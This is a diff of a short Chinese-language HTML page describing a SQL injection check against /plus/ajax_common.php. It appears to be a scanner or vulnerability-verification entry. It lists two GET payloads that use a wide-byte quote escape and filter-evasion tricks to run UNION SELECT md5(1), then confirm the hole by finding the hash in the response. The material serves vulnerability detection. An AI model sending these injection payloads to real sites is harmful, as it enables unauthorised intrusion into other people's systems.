@@ -1,13 +1,10 @@
 <meta charset="UTF-8">
 <div>
     <h3>SQL注入 URL: </h3>
-    <ul>
-        <p>/plus/ajax_common.php</p>
-    </ul>
-    <h3>GET-payload: </h3>
-        <code>?act=hotword&query=%E9%8C%A6%27union+/*!50000SeLect*/+1,md5(1),3%23</code>
-        <code>?act=hotword&query=%E9%8C%A6%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,md5(1),3%23</code>
+    <code>http://example.com/plus/ajax_common.php?act=hotword&query=%E9%8C%A6%27union+/*!50000SeLect*/+1,md5(1),3%23</code>
+    <br>
+    <code>http://example.com/plus/ajax_common.php?act=hotword&query=%E9%8C%A6%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,md5(1),3%23</code>
     <h3>验证过程</h3>
-    <p>分别访问如上两个url，查看response text 是否含有"1"的md5值 "c4ca4238a0b923820dcc509a6f75849b"</p>
+    <p>分别访问如上两个url，查看返回页面源码中是否含有字符：c4ca4238a0b923820dcc509a6f75849b</p>
     <p>如其中一个验证成功，即漏洞存在。</p>
 </div>
